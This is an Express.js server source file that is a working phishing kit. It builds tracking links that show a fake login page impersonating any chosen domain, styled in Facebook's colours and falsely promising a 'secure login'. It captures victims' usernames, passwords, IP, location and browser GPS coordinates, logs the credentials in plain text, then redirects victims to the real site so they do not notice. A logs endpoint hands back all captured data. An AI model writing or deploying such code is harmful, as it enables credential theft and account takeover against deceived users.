const express = require('express');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');
const dns = require('dns');
const app = express();
const port = 3000;

let urlDatabase = {};
let visitLogs = {};
let credentialsLogs = {};

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Allow-Methods', '*');
    next();
});

// IP middleware
app.use((req, res, next) => {
    const clientIp = requestIp.getClientIp(req);
    const geo = geoip.lookup(clientIp);
    req.clientInfo = { ip: clientIp, geo: geo };
    next();
});

// Generate tracking link - SIMPLE VERSION
app.post('/generate', (req, res) => {
    console.log('📨 Received generate request:', req.body);
    
    const originalUrl = req.body.url;
    
    if (!originalUrl) {
        return res.status(400).json({ error: 'URL is required' });
    }

    const id = uuidv4();
    urlDatabase[id] = originalUrl;
    visitLogs[id] = [];
    credentialsLogs[id] = [];
    
    console.log(`✅ Generated tracking link for: ${originalUrl} (ID: ${id})`);
    
    res.json({ 
        trackingLink: `http://localhost:${port}/track/${id}`,
        id: id
    });
});

// Track visits - FAKE LOGIN PAGE
app.get('/track/:id', async (req, res) => {
    try {
        const id = req.params.id;
        const originalUrl = urlDatabase[id];
        
        console.log(`📍 Tracking visit for ID: ${id}, URL: ${originalUrl}`);
        
        if (!originalUrl) {
            return res.status(404).send('Tracking link not found');
        }

        // Extract domain name for display
        const domain = originalUrl.replace(/^https?:\/\//, '').split('/')[0];
        
        // Log the visit
        visitLogs[id].push({
            timestamp: new Date(),
            ip: req.clientInfo.ip,
            geo: req.clientInfo.geo,
            userAgent: req.headers['user-agent'],
            domain: domain
        });

        console.log(`👀 Visit logged from IP: ${req.clientInfo.ip} for ${domain}`);

        // Serve fake login page
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Login - ${domain}</title>
                <style>
                    * {
                        margin: 0;
                        padding: 0;
                        box-sizing: border-box;
                    }
                    
                    body {
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        padding: 20px;
                    }
                    
                    .login-container {
                        background: white;
                        padding: 40px;
                        border-radius: 10px;
                        box-shadow: 0 15px 35px rgba(0,0,0,0.1);
                        width: 100%;
                        max-width: 400px;
                    }
                    
                    .logo {
                        text-align: center;
                        margin-bottom: 30px;
                        color: #333;
                    }
                    
                    .logo h1 {
                        font-size: 24px;
                        margin-bottom: 10px;
                        color: #1877f2;
                    }
                    
                    .form-group {
                        margin-bottom: 20px;
                    }
                    
                    label {
                        display: block;
                        margin-bottom: 5px;
                        color: #333;
                        font-weight: bold;
                    }
                    
                    input[type="text"],
                    input[type="password"] {
                        width: 100%;
                        padding: 15px;
                        border: 2px solid #ddd;
                        border-radius: 5px;
                        font-size: 16px;
                        transition: border-color 0.3s;
                    }
                    
                    input[type="text"]:focus,
                    input[type="password"]:focus {
                        border-color: #1877f2;
                        outline: none;
                    }
                    
                    .submit-btn {
                        width: 100%;
                        padding: 15px;
                        background: #1877f2;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        transition: background 0.3s;
                    }
                    
                    .submit-btn:hover {
                        background: #166fe5;
                    }
                    
                    .forgot-password {
                        text-align: center;
                        margin-top: 15px;
                    }
                    
                    .forgot-password a {
                        color: #1877f2;
                        text-decoration: none;
                    }
                    
                    .security-notice {
                        text-align: center;
                        margin-top: 20px;
                        padding: 15px;
                        background: #f8f9fa;
                        border-radius: 5px;
                        font-size: 14px;
                        color: #666;
                    }
                </style>
            </head>
            <body>
                <div class="login-container">
                    <div class="logo">
                        <h1>${domain}</h1>
                        <p>Please log in to continue</p>
                    </div>
                    <form id="loginForm">
                        <div class="form-group">
                            <label for="username">Email or Phone:</label>
                            <input type="text" id="username" name="username" required placeholder="Enter your email or phone">
                        </div>
                        <div class="form-group">
                            <label for="password">Password:</label>
                            <input type="password" id="password" name="password" required placeholder="Enter your password">
                        </div>
                        <button type="submit" class="submit-btn">Log In</button>
                    </form>
                    <div class="forgot-password">
                        <a href="#">Forgotten password?</a>
                    </div>
                    <div class="security-notice">
                        🔒 Secure login. Your information is protected.
                    </div>
                </div>

                <script>
                    document.getElementById('loginForm').addEventListener('submit', function(e) {
                        e.preventDefault();
                        
                        const formData = {
                            username: document.getElementById('username').value,
                            password: document.getElementById('password').value,
                            domain: '${domain}'
                        };

                        // Show loading
                        const submitBtn = document.querySelector('.submit-btn');
                        submitBtn.textContent = 'Logging in...';
                        submitBtn.disabled = true;

                        // Get geolocation
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(function(position) {
                                formData.latitude = position.coords.latitude;
                                formData.longitude = position.coords.longitude;
                                submitCredentials(formData);
                            }, function() {
                                submitCredentials(formData);
                            });
                        } else {
                            submitCredentials(formData);
                        }
                    });

                    function submitCredentials(formData) {
                        fetch('http://localhost:3000/logcredentials/${id}', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(formData)
                        }).then(response => {
                            if (response.ok) {
                                // Redirect to original URL after success
                                window.location.href = '${originalUrl}';
                            } else {
                                alert('Login failed. Please try again.');
                                location.reload();
                            }
                        }).catch(error => {
                            alert('Connection error. Please try again.');
                            location.reload();
                        });
                    }
                </script>
            </body>
            </html>
        `);

    } catch (error) {
        console.error('Error in /track:', error);
        res.status(500).send('Error loading page');
    }
});

// Log credentials
app.post('/logcredentials/:id', async (req, res) => {
    try {
        const id = req.params.id;
        
        console.log('🔐 Received credentials for ID:', id, 'Data:', req.body);
        
        if (!credentialsLogs[id]) {
            return res.status(404).json({ error: 'Tracking ID not found' });
        }

        const credentialData = {
            timestamp: new Date(),
            ip: req.clientInfo.ip,
            geo: req.clientInfo.geo,
            userAgent: req.headers['user-agent'],
            credentials: req.body
        };

        credentialsLogs[id].push(credentialData);

        console.log('✅ CREDENTIALS CAPTURED:', {
            trackingId: id,
            username: req.body.username,
            password: req.body.password,
            domain: req.body.domain,
            ip: req.clientInfo.ip
        });

        res.json({ success: true, message: 'Credentials logged successfully' });
    } catch (error) {
        console.error('Error in /logcredentials:', error);
        res.json({ success: true });
    }
});

// Get logs
app.get('/logs/:id', (req, res) => {
    try {
        const id = req.params.id;
        
        console.log('📊 Fetching logs for ID:', id);
        
        if (!visitLogs[id]) {
            return res.status(404).json({ error: 'Tracking ID not found' });
        }

        const response = {
            visits: visitLogs[id],
            credentials: credentialsLogs[id] || []
        };

        console.log(`📈 Sending logs: ${response.visits.length} visits, ${response.credentials.length} credentials`);
        
        res.json(response);
    } catch (error) {
        console.error('Error in /logs:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'Server is running',
        timestamp: new Date().toISOString(),
        totalTrackedUrls: Object.keys(urlDatabase).length
    });
});

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Start server
app.listen(port, () => {
    console.log(`🚀 Server running at http://localhost:${port}`);
    console.log(`📍 Dashboard: http://localhost:${port}`);
    console.log(`🔧 Health check: http://localhost:${port}/health`);
    console.log('✅ Ready to generate tracking links!');
});